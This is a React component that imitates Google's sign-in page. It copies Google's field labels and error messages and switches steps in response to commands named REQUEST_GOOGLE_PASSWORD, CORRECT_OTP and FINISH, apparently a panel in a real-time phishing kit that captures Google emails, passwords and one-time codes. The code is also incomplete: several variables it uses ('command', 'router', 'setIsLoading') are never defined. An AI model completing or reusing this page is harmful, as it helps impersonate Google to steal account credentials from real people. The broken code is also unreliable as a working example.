import React, { useState, useEffect } from 'react';



export default function GoogleForm({ currentStep, email, setEmail, password, setPassword, invalid }) {
    // Command handling
        useEffect(() => {
            console.log("command in googleAuth is ", command)
            if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
                // setInvalid(true);
                // setIsLoading(false);
                // setCurrentStep('email');
            } 
            else if (command === 'REQUEST_GOOGLE_PASSWORD') {
                console.log("command in passcheck is ", command)
                // setIsLoading(false);
                // setBgLoader(true);
                // setCurrentStep('password');
            }
            else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
                // setCommand('REQUEST_GOOGLE_PASSWORD_AGAIN');
                // setInvalid(true);
                // setIsLoading(false);
                // setCurrentStep('password');
            }
            else if (command === 'CORRECT_OTP') {
                setIsLoading(false);
                setBgLoader(true);
                // setTimeout(() => {
                //     router.push('/OTPVerification');
                // }, 1500);
            }
            else if (command === 'FINISH') {
                setIsLoading(false);
                setBgLoader(true);
                setTimeout(() => {
                    router.push('/Dashboard');
                }, 1500);
            }
        }, [command]);
    





    return (
        <div className='flex-col gap-y-2 h-full flex w-full'>
            <form className="flex-col gap-y-2 h-full flex w-full">
                {currentStep === 'email' ? (
                    <div className="relative w-full">
                        <input 
                            type="text" 
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className={`rounded p-[15px] border text-[16px] w-full ${
                                invalid ? 'border-red-500' : 'border-gray-800'
                            } text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer`}
                        />
                        <label 
                            htmlFor="inputField" 
                            className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base"
                        >
                            Email or phone
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-1">
                                Couldn't find your Google Account
                            </div>
                        )}
                    </div>
                ) : (
                    <div className="relative w-full">
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className={`rounded p-[15px] border text-[16px] w-full ${
                                invalid ? 'border-red-500' : 'border-gray-800'
                            } text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer`}
                        />
                        <label
                            htmlFor="passwordField"
                            className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base"
                        >
                            Enter your password
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-1">
                                Wrong password. Try again or click Forgot password to reset it.
                            </div>
                        )}
                    </div>
                )}

                <div className="w-full font-medium google text-blue-700 text-[15px] flex justify-start items-center">
                    {currentStep === 'password' ? 'Forgot password?' : 'Forgot email?'}
                </div>

                {currentStep === 'email' && (
                    <div className="text-[15px] text-gray-700 leading-tight mt-9 pr-5">
                        Before using this app, you can review Google's <span className="text-blue-700 font-normal">privacy policy</span>
                        and <span className="text-blue-700 font-normal">terms of service.</span>
                    </div>
                )}
            </form>
        </div>
    )
}